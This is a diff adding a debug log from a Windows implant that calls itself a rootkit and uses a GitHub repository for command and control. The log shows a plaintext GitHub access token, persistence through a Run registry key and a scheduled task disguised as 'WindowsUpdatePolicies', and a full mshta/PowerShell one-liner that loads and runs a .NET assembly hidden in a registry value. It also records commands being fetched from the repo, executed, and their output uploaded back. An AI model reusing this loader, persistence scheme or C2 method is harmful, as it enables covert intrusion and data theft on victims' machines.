@@ -1,0 +1,49 @@
+Sun Sep  5 22:46:41 2021. Initialisation of the log file.
+
+DEBUG: Sun Sep  5 22:46:41 2021: GithubLogin: hidemepls785
+DEBUG: Sun Sep  5 22:46:41 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Sun Sep  5 22:46:41 2021: GihubAccessToken: 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
+DEBUG: Sun Sep  5 22:46:41 2021: Rootkit Name: CorepMoulinPreprod01
+DEBUG: Sun Sep  5 22:46:41 2021: Rootkit Registry Key: Sensors
+DEBUG: Sun Sep  5 22:46:41 2021: Schtasks Task Name: WindowsUpdatePolicies
+DEBUG: Sun Sep  5 22:46:41 2021: Run Registry Key Name: WindowsUpdate
+DEBUG: Sun Sep  5 22:46:41 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Sun Sep  5 22:46:41 2021: The folder list for random folder is not empty. Its size is: 3504
+DEBUG: Sun Sep  5 22:46:41 2021: The random path choosed for this execution is: C:\Users\gilles\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\RoamingState
+DEBUG: Sun Sep  5 22:46:41 2021: Start of the method setRunRegistryCommand.
+DEBUG: Sun Sep  5 22:46:41 2021: Success to create the registry run key.
+DEBUG: Sun Sep  5 22:46:41 2021: Start of the method createSchTaskCommandLine. 
+DEBUG: Sun Sep  5 22:46:41 2021: This content will be written in the start up batch: @echo off
+mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Sensors\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
+exit
+DEBUG: Sun Sep  5 22:46:41 2021: The batch for persistence by schtasks is present.
+DEBUG: Sun Sep  5 22:46:42 2021: Start of a new loop to get commands and treat them.
+DEBUG: Sun Sep  5 22:46:42 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Sun Sep  5 22:46:42 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Sun Sep  5 22:46:42 2021: Success to check the commands with rootkit_path1
+DEBUG: Sun Sep  5 22:46:42 2021: Getting this command from the github repo: execute_cmd schtasks //query //TN "WindowsUpdatePolicies"
+DEBUG: Sun Sep  5 22:46:42 2021: Start to treat the commands sent by the github repo.
+DEBUG: Sun Sep  5 22:46:42 2021: The command stay_alive has not been received, the rootkit will end the execution after treating the commands.
+DEBUG: Sun Sep  5 22:46:42 2021: Command received: execute_cmd
+DEBUG: Sun Sep  5 22:46:42 2021: The following command will be executed by powershell: schtasks //query //TN "WindowsUpdatePolicies" > C:\Users\gilles\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\RoamingState\target_command1.log
+DEBUG: Sun Sep  5 22:46:45 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\RoamingState\target_command1.log
+DEBUG: Sun Sep  5 22:46:45 2021: The file that will be read weight: 0
+DEBUG: Sun Sep  5 22:46:45 2021: Success to read the binary file. This number of bytes have been read: 1
+DEBUG: Sun Sep  5 22:46:45 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Sun Sep  5 22:46:45 2021: Start of the method writeFileWindowsApi.
+DEBUG: Sun Sep  5 22:46:45 2021: The content size that will be written: 1
+DEBUG: Sun Sep  5 22:46:45 2021: Success to write the content(number of bytes : 1) in the file : C:\Users\gilles\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\RoamingState\target_command1.log
+DEBUG: Sun Sep  5 22:46:45 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Sun Sep  5 22:46:45 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sun Sep  5 22:46:45 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\RoamingState\target_command1.log
+DEBUG: Sun Sep  5 22:46:45 2021: The file that will be read weight: 1
+DEBUG: Sun Sep  5 22:46:45 2021: Success to read the binary file. This number of bytes have been read: 2
+DEBUG: Sun Sep  5 22:46:45 2021: The files C:\Users\gilles\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\RoamingState\target_command1.log has been uploaded successfully in the github repo
+DEBUG: Sun Sep  5 22:46:45 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Sun Sep  5 22:46:45 2021: #####################################################
+
+DEBUG: Sun Sep  5 22:46:45 2021: Start of GithubCommunication::sendResults
+DEBUG: Sun Sep  5 22:46:46 2021: The results was uploaded on the github repo
+DEBUG: Sun Sep  5 22:46:46 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Sun Sep  5 22:46:46 2021: This is the end of servant mission.
+DEBUG: Sun Sep  5 22:46:46 2021: Start of GithubCommunication::sendLogs
